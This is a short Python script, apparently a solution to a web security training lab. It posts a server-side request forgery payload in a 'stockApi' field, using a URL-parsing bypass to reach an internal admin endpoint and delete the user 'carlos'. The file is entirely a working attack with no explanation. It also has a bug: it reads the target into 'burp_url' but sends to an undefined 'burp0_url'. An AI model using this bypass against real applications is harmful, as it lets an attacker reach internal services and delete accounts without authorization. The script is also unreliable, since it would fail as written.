import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

burp0_headers = {}
burp0_data = {"stockApi": "http://localhost:80%23@stock.weliketoshop.net/admin/delete?username=carlos"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
